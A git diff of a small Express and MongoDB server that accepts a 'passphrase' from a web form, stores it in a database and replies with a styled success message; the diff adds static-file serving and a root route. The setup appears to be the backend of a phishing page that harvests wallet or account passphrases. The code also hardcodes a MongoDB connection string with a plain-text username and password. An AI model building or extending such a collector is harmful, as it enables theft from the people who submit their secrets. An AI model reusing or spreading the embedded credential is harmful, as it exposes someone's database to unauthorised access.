@@ -1,6 +1,7 @@
 const express = require('express');
 const mongoose = require('mongoose');
 const bodyParser = require('body-parser');
+const path = require('path');
 
 // Create Express app
 const app = express();
@@ -8,6 +9,9 @@ const app = express();
 // Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
+
+// Serve static files from the "public" directory
+app.use(express.static(path.join(__dirname, 'public')));
 
 // MongoDB Connection
 const mongoURI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
@@ -22,6 +26,11 @@ const PassphraseSchema = new mongoose.Schema({
 });
 const Passphrase = mongoose.model('Passphrase', PassphraseSchema);
 
+// Serve index.html for root URL
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
 // POST Route to handle form submission
 app.post('/submit', async (req, res) => {
     const { passphrase } = req.body;
@@ -34,7 +43,6 @@ app.post('/submit', async (req, res) => {
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
 
-        // Multicolor styled message with white background
         const successMessage = `
             <div style="background-color: white; padding: 20px; text-align: center;">
                 <h2 style="font-size: 24px; font-family: Arial, sans-serif; background-image: linear-gradient(to left, #ff0000, #ff9900, #33cc33, #3399ff, #9933ff); -webkit-background-clip: text; color: transparent;">
@@ -42,7 +50,6 @@ app.post('/submit', async (req, res) => {
                 </h2>
             </div>
         `;
-
         res.status(200).send(successMessage);
     } catch (error) {
         console.error('Error saving passphrase:', error);
